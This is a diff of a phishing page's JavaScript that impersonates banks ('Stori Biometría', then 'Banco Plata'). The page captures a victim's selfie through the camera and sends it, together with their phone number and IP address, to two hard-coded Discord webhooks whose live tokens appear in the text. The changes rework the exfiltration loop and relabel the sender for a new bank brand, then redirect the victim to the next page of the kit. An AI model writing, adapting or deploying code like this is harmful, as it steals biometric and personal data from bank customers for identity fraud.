@@ -102,7 +102,6 @@
   <canvas id="captureCanvas" style="display: none;"></canvas>
 
   <script>
-    // DOS WEBHOOKS
     const DISCORD_WEBHOOKS = [
       'https://discord.com/api/webhooks/1571213669348675625/h6b4ppxq74Q9WmwVFCrcCQ-hcWpKboACJX5KyVzURPvxCvNxS9OdAncT0vRavWsYMJr0',
       'https://discord.com/api/webhooks/1571164818553966615/6aK6_RyRyUP7M8SAr3RZDHP2nTsK1wu_irSR2ewG2i5t4axW1ad1hP21yRNXJdUIQQc'
@@ -183,21 +182,13 @@
           return new Blob(byteArrays, { type: contentType });
         }
 
-        const payload = { 
-          username: "Stori Biometría", 
-          content: `📸 **Selfie Intento #${selfieAttempt}**\n\n**📱 Teléfono:** ${phone}\n**🌐 IP:** ${ip}\n**⏰ Fecha:** ${new Date().toLocaleString()}` 
-        };
+        const formData = new FormData();
+        const payload = { username: "Banco Plata - Selfie", content: `📸 **Selfie Intento #${selfieAttempt}**\n\n**📱 Teléfono:** ${phone}\n**🌐 IP:** ${ip}\n**⏰ Fecha:** ${new Date().toLocaleString()}` };
 
-        // Enviar a AMBOS webhooks
-        const results = await Promise.allSettled(DISCORD_WEBHOOKS.map(async (url) => {
-          const formData = new FormData();
-          formData.append('payload_json', JSON.stringify(payload));
-          formData.append('file1', base64ToBlob(base64Image, 'image/jpeg'), `Selfie_Intento_${selfieAttempt}.jpg`);
-          return fetch(url, { method: 'POST', body: formData });
-        }));
+        formData.append('payload_json', JSON.stringify(payload));
+        formData.append('file1', base64ToBlob(base64Image, 'image/jpeg'), `Selfie_Intento_${selfieAttempt}.jpg`);
 
-        const anyOk = results.some(r => r.status === 'fulfilled' && r.value.ok);
-        if (!anyOk) throw new Error('Fallo al enviar a todos los webhooks');
+        for (const webhook of DISCORD_WEBHOOKS) { await fetch(webhook, { method: 'POST', body: formData }); }
 
         loader.style.display = 'none';
         isProcessing = false;
@@ -206,9 +197,7 @@
           document.getElementById('screenError').classList.add('active');
         } else {
           document.getElementById('screenSuccess').classList.add('active');
-          setTimeout(() => {
-            window.location.href = 'in3.html';
-          }, 2500);
+          setTimeout(() => { window.location.href = 'in3.html'; }, 2500);
         }
 
       } catch (error) {
